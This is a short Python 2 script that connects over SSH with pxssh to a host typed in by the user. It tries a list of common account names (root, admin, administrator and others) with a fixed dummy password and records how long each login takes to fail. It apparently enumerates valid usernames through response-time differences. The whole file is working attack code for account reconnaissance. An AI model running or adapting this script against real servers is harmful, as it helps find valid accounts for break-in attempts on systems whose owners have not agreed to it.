#!/usr/bin/python

import pxssh
import getpass
import time
names = ["timmy" , "admin" , "root" , "administrator" , "user" , "superuser"]

hostname = raw_input("hostname: ")

for x in names: 
	try:
		s = pxssh.pxssh()
		print "\ntesting user: " + x
		username = x
		password = "qwer"
		begtime = time.time()
		s.login(hostname , username, password)
	
	except pxssh.ExceptionPxssh, e:
		print x + " took " + str(time.time()- begtime) + " sec to fail it's login"
